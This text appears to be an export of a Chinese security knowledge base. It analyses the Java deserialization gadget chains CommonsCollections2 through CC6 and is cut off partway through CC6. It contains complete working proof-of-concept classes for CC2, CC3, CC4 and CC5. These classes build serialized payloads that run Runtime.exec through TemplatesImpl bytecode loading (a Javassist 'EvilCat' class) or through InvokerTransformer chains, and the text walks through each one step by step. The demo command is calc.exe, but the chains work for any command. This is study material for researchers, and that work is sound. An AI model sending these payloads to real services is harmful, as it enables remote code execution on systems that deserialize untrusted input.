在inputStream.readObject()处打断点，跟进直到comparator.compare()方法中进入comparator.compare() 方法中在这里可以看到这里会去执行TemplatesImpl.newTransformer()方法方法 在这里可以看到0x3中说_name可以为任意值，但不能为null，以及_class要为null，因为只有当_class为null，才能执行defineTransletClasses()函数![图片.png](https://cdn.nlark.com/yuque/0/2022/png/21929389/1652081732138-12a14b9e-31de-4ec7-b656-8bcbcd949e9c.png#clientId=u2044ba9c-3055-4&from=paste&height=1040&id=u47cea69b&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=201107&status=done&style=none&taskId=u1f601e89-5433-458c-9e53-3cbd9e1a86d&title=&width=1920)进入defineTransletClasses函数，可以看到这个注释，大概意思就是会返回对自定义的类![图片.png](./Commons Collection2 分析.assets/2023_05_19_10_37_20_sKSidtZV.png)loader.defineClass(_bytecodes[i]);将字节数组还原为Class对象 ,_class[0]就是恶意类 这里对比父类是否是AbstractTranslet,这里就解释了0x2中为什么一定要继承AbstractTranslet![图片.png](https://cdn.nlark.com/yuque/0/2022/png/21929389/1652082143879-39850134-ba3f-452f-8c61-cf922ebad974.png#clientId=u2044ba9c-3055-4&from=paste&height=1040&id=ud6aeed6a&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=226366&status=done&style=none&taskId=uf58db8f4-bd39-4362-a990-c488fc90c71&title=&width=1920)如果_transletIndex没有被赋值（初始值为-1）,那么在下面的if语块中就会抛出异常![图片.png](https://cdn.nlark.com/yuque/0/2022/png/21929389/1652082286939-0a17fea0-b100-49f5-88f9-537705637d53.png#clientId=u2044ba9c-3055-4&from=paste&height=1040&id=u66837fde&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197424&status=done&style=none&taskId=uf1652a5d-e632-4357-b802-c81ca450865&title=&width=1920)在这里实例化_class[_transletIndex].newInstance()，也就是我们使用Javassit生成的恶意代码（执行Runtime.getRuntime.exec()`） 总结 构造CC2要比CC1更复杂，其中CC2使用TemplatesImpl需要注意 comparator不需要再构造transformerChain，而是需要调用TemplayesImpl的newTransformer方法 恶意类需要继承AbstractTranslet类 对应的参数一定要构造正常 链路为TemplatesImpl.newTransformer -> getTransletInstance() -> defineTransletClasses -> 得到字节数组还原为的Class对象 -> 实例化 最后添加根据ysoserial CC2 的payload，改了一个可用的poc package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.CannotCompileException; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class yso2CC2 { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer)); queue.add(1); queue.add(2); setFieldValue(transformer,\"iMethodName\",\"newTransformer\"); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); Object[] queueArray = (Object[]) getFieldValue(queue, \"queue\"); queueArray[0] = templates; queueArray[1] = 1; try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./ycc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./ycc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } public static Object getFieldValue(final Object obj, final String fieldName) throws Exception { final Field field = getField(obj.getClass(), fieldName); return field.get(obj); } } 参考链接 https://xz.aliyun.com/t/8164 https://xz.aliyun.com/t/10387 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:01:06 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/02.CC2/CommonsCollection2分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/03.CC3/CommonsCollections3分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/03.CC3/CommonsCollections3分析.html","title":"CommonsCollections3分析","keywords":"","body":" 简介 前置知识 TrAXFilter InstantiateTransformer POC 分析 0x1 0x2 0x3 0x4 调试 参考链接 简介 CC3 相当于CC1，CC2的结合，环境依赖需要commons collections 3.1，jdk1.7，以及javasisst 对应的利用链如下： ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 前置知识 CC1 lazymap 分析 CC2 TemplatesImpl 分析 在分析CC3之前需要了解一下新出现的两个类 TrAXFilter 在该类的构造方法中，调用了传入参数的newTransformer()方法，看到这个方法有点熟悉了，可以实例化，并且参数可控 CC2中，就是在InvokerTransformer.transform()中通过反射调用TemplatesImpl.newTransformer()方法，而CC3中，就可以直接使用TrAXFilter来调用newTransformer()方法 InstantiateTransformer 在该类中实现了Transformer，Serializable接口 在它的transform方法中，实现了当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回 POC package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; public class TestCC3 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // cc.writeFile(); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"payload3.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(handler); FileInputStream fileInputStream = new FileInputStream(\"payload3.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 分析 0x1 与CC2 相同，通过javasisst动态创建一个类，这个类里包括static代码，只要实例化这个类就能执行static里的代码，最后将该类转换成字节码存储在byte[][]这个二维数组中，在CC2 中可以知道这个字节码是被用来存储在private byte[][] _bytecodes这个二维数组中被实例化的 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // cc.writeFile(); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } 0x2 第二步同CC1的LazyMap 利用链，不过这里的Transformer[]中，ConstantTransformer的构造函数传入的TrAXFilter.class，而这个类构造函数接收的_templates参数，也就是我们在第一步中构造的_templates实例，当调用(TransformerImpl) templates.newTransformer();的时候，就会调用我们构造的恶意类的static方法 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); 而怎么才能调用(TransformerImpl) templates.newTransformer();呢，这个时候就要用InstantiateTransformer了，InstantiateTransformer，前置知识中提到了该类实现了Transformer，Serializable接口，当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回 那么当链式调用的时候，传入input是TrAXFilter，在对其进行实例化的时候，我们已经通过InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})构造函数，已经将iParamTypes，iArgs传入，其中iParamTypes = Templates.class, iArgs = javasisst创建的恶意类，在实例化的时候 0x3 LazyMap get()方法调用了transform()方法，factory参数就是传入的transformerChain，达到了代码2的条件 0x4 还是P牛那句话： 如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 AnnotationInvocationHandler是调用处理器，outerMap是被代理的对象，只要调用了LazyMap中的任意方法，就会触发AnnotationInvocationHandler中的invoke方法； 而在readObject方法中调用了entrySet()方法，所以触发invoke 这样就基本上达到了执行命令所需要的条件。 调试 this.memberValues参数值为LazyMap，调用了它的entrySet方法，触发到invoke方法； 跟进到ChainedTransformer.transform()，对transformers[]数组进行循环；第一轮循环，iTransformers[0]参数值为ConstantTransformer，进入它的transform方法，返回TrAXFilter类；第二轮循坏，iTransformers[1]参数值为InstantiateTransformer，TrAXFilter作为参数传入transform方法； 在getConstructor(iParamTypes)中，iParamTypes参数为Templates类，获取到构造函数为TrAXFilter，且在实例化的时候，需要传递Templates类型的参数，iargs则是我们构造的对应的Templates类实例（templates），在实例化过程中，再调用TransformerImpl的newTransformer()； 方法； 实例化_class[_transletIndex]，该参数的值就为EvilCat9080096364400() 最后命令执行成功 参考链接 https://xz.aliyun.com/t/10454#toc-1 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:01:55 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/03.CC3/CommonsCollections3分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/04.CC4/CommonsCollections4分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/04.CC4/CommonsCollections4分析.html","title":"CommonsCollections4分析","keywords":"","body":" 简介 前置知识 环境 利用链 POC 分析 0x1 0x2 0x3 0x4 调试 简介 CC4 相当于 CC2 + CC3 的结合，在ysoseria中CC4提及的是，Variation on CommonsCollections2 that uses InstantiateTransformer instead of InvokerTransformer. 也就是说CC4 只需要在CC2的基础上（javassist）将InvokerTransformer修改成InstantiateTransformer,InstantiateTransforme 在CC3中可以知道，实现了Transformer，Serializable接口，在它的transform方法中，实现了当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回，要达到使用InstantiateTransforme 的transform方法，这时又离不开TrAXFilter的构造函数，在其实例化之后就能调用TransformerImpl的newTransformer方法，最后实现调用恶意代码 前置知识 Commons Collections2 分析 Commons Collections3 分析 环境 jdk1.8 commons collections4利用链 ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() POC ```java package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC4 { public static void main(String[] args) throws Exception{ PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] taegetClassBytes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,taegetClassBytes); Field field1 = templates.getClass().getDeclaredField(\"_name\"); field1.setAccessible(true); field1.set(templates,\"123\"); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chain = new ChainedTransformer(transformers); queue.add(1); queue.add(1); TransformingComparator Tcomparator = new TransformingComparator(chain); Field comparator_field = PriorityQueue.class.getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ FileOutputStream fileOutputStrem = new FileOutputStream(\"cc4.ser\"); ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStrem); outputStream.writeObject(queue); FileInputStream fileInputStream = new FileInputStream(\"cc4.ser\"); ObjectInputStream inputStream = new ObjectInputStream(fileInputStream); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } ![image.png](Commons Collections4 分析.assets/2023_05_19_10_37_25_uGqCkxoU.png) ## 分析 ### 0x1 ```java PriorityQueue queue = new PriorityQueue(1); CC2中我们可以知道，为什么明明PriorityQueue的构造函数中可以传入TransformingComparator的实例，但是我们却不使用可以传入TransformingComparator实例的构造方法，因为在传入之后，会直接调用TransformingComparator实例的方法，导致在还没有序列化的时候程序就已经crash了，这一步是实现CC2，CC4的关键 0x2 通过javasisst创建恶意代码，并将恶意代码写入到TemplatesImpl实例化后的_bytecodes,_name参数中，详情看Commons Collections3 分析 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] taegetClassBytes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,taegetClassBytes); Field field1 = templates.getClass().getDeclaredField(\"_name\"); field1.setAccessible(true); field1.set(templates,\"123\"); 0x3 ChainedTransformer类会把我们的Transformer变成一个串，用于执行transform方法链式调用transformers[] 给队列赋值 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chain = new ChainedTransformer(transformers); queue.add(1); queue.add(1); 0x4 当赋值操作完成之后，再对comparator进行赋值操作，这样就能在赋值操作前不直接crash掉，并且在反序列化的时候comparator不为空，又能直接调用transform方法 TransformingComparator Tcomparator = new TransformingComparator(chain); Field comparator_field = PriorityQueue.class.getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); 调试 在调试过程中，前部分同CC2，一直到comparator.compare(),comparator为反射传入的Tcomparator，当调用compare方法时，就会执行this.transformer.transform(obj1),最后就回直接到TraXFilter的构造函数里，执行newTransformer 最后在getTransletInstance函数里，将传入的字节码实例化 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:03:27 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/04.CC4/CommonsCollections4分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/05.CC5/CommonsCollections5分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/05.CC5/CommonsCollections5分析.html","title":"CommonsCollections5分析","keywords":"","body":" 简介 TiedMapEntry BadAttributeValueExpException POC 0x1 0x2 调试 简介 CC5 利用的还是CC1的链路，使用LazyMap，只要调用了LazyMap.get()，就可以触发ChainedTransformer，链式调用，那么在CC5中，在哪儿会调用这个get方法呢？ 在CC1 LazyMap 利用链中，我们知道动态代理对象调用任何一个方法时会调用handler中的invoke方法，然而我们知道sun.reflect.annotation.AnnotationInvocationHandler，会发现实际上这个类就是一个InvocationHandlerAnnotationInvocationHandler类，如果将这个恶意对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中。 在CC5中这里引入了新的两个类，分别是TiedMapEntry，BadAttributeValueExpException TiedMapEntry 可以看到map，和key都是可控的，在调用getValue的时候，就直接调用get方法，实现LazyMap#get() 那么要在哪里调用这个getvalue函数呢，在TiedMapEntry里，我们可以看到该类为其实现了一个toString()方法 那么找到能调用TiedMapEntry#toString()方法就显得至关重要，接下来BadAttributeValueExpException类就会带来一片光明 BadAttributeValueExpException BadAttributeValueExpexception 在readObject的时候，如果能读这个valObj为TiedMapEntry的实例，那么是不是就是一条完美的链路？ 在此处，我们可以看到BadAttributeValueExpexception 的构造函数只有一个值val，但是类型是Object，那么我们可以按如下构造，当其反序列化的时候，调用readObject()函数的时候，反序列化得到的valObj就是对应的TiedMapEntry实例 // 创建一个实例 BadAttributeValueExpException val = new BadAttributeValueExpException(null); // 反射赋值 Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,\"TiedMapEntry实例对象\"); POC package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; /* @params Test Env jdk8u181 Commons Collection3.1 */ public class TestCC5 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"1\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,entry); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc5.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(val); FileInputStream fileInputStream = new FileInputStream(\"cc5.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } 0x1 第一部分为CC1 LazyMap 利用链前部分，也可以参考CC1 分析，这里只要调用了LazyMap#get，就会触发ChainedTransformer.transform(),进而对transformers链式调用 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformerChain); 0x2 在简介中可以看到，TiedMapEntry实例化的entry需要赋值给BadAttributeValueExpException@val,当反序列化的时候，取到对象，则会调用TiedMapEntry#toString方法，进而调用TiedMapEntry#get方法，其中Map可控，就是反序列化得来的恶意的TiedMapEntry实例lazymap TiedMapEntry entry = new TiedMapEntry(lazyMap, \"1\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,entry); 对应的调用链为 Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 调试 调试过程和LazyMap是一样的，我们在LazyMap#get处factory.transform(key)处打下断点来分析 可以看到利用链路为BadAttributeValueExpException.readObject()-> TiedMapEntry.toString()-> LazyMap.get()->ChainedTransformer.transform() 这里就是常规链式调用了 注：在调试过程中，如果在LazyMap#get前的堆栈打上断点，就无法进入LazyMap.get()的if语句 在调试过程中，如果在LazyMap.get()之前的堆栈中打下断点，比如BadAttributeValueExpException.readObject()、TiedMapEntry.toString()、TiedMapEntry.getValue()处打上断点，是无法进入 LazyMap.get()if 判断语句 在这里可以看到，我圈起来的部分，这里的意思就是已经执行了，因为发生调用了，只不过debug无法进入 到这里我们直接看LazyMap.get()方法，这里断点一定要打在if处，不然是不能进入断点 可以看到，在if处，得到了map参数已经不是空，而是在序列化的时候已经赋的初值。 可以通过比较没有在LazyMap.get()前的堆栈下断点的区别 图1 LazyMap.get()堆栈前下断点 图2 LazyMap.get()堆栈前无断点 这就是为什么我在调试部分我没有在其他函数处打断点，而是直接在LazyMap#get()处打断点。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:04:18 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/05.CC5/CommonsCollections5分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/06.CC6/CommonsCollections6分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/06.CC6/CommonsCollections6分析.html","title":"CommonsCollections6分析","keywords":"","body":" 简介 分析链路 环境 ysoserial分析 POC ysoserial（反序列化的HashSet） 更改poc(反序列化HashMap) 更改POC_1(反序列化HashSet 1次反射) 简介 CC6 也是利用的是CC1 LazyMap#get, 触发ChainedTransformer链式调用，当然和CC5一样，得去寻找对应在哪儿会调用LazyMap#get,这里还是使用TiedMapEntry类，因为该类的构造函数map值可控，可以构造为lazymap，在Commons Collections 5 分析中，可以知道只要调用TiedMapEntry#getvalue 就能执行TiedMapEntry#get 在TiedMapEntry#get方法中，map值即为可控的lazymap 目前在jdk1.7，jdk8u81测试是没有问题 分析链路 /* Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() by @matthias_kaiser */ 环境 jdk1.7 Commons Collection 3.1 看一下TiedMapEntry.java 源码，在hashCode() 方法中调用了getValue()函数，也就是需要找到TiedMapEntry的实例来调用这个hashCode()函数 /** * Constructs a new entry with the given Map and key. * * @param map the map * @param key the key */ public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } /** * Gets the value of this entry direct from the map. * * @return the value */ public Object getValue() { return map.get(key); } /** * Gets a hashCode compatible with the equals method. * * Implemented per API documentation of {@link java.util.Map.Entry#hashCode()} * * @return a suitable hash code */ public int hashCode() { Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } 那么去看看ysoserial里提供的CC6链路（这里截取一部分），从readObject()之后，主要需要看HashMap#put-> HashMap#hash是如何调用到TiedMapEntry#hashcode，这时就需要关注HashMap类 java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() 我们从后往前分析先看HashMap#hash 这里传递的参数k是一个Obejct，只要k对象不是String类型，那么就会执行hashCode()方法，那么这里就需要想办法让指定参数k为TiedMapEntry的实例 // HashMap.java final int hash(Object k) { int h = hashSeed; if (0 != h && k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h >>> 20) ^ (h >>> 12); return h ^ (h >>> 7) ^ (h >>> 4); } 继续看HashMap#put, 在下面代码块的20行调用了hash()，此处put(K key, V value)接收的参数key要传入key保证为TiedMapEntry的实例，且table不能为EMPTY_TABLE // HashMap.java /** * Associates the specified value with the specified key in this map. * If the map previously contained a mapping for the key, the old * value is replaced. * * @param key key with which the specified value is to be associated * @param value value to be associated with the specified key * @return the previous value associated with key, or * null if there was no mapping for key. * (A null return can also indicate that the map * previously associated null with key.) */ public V put(K key, V value) { if (table == EMPTY_TABLE) { inflateTable(threshold); } if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry e = table[i]; e != null; e = 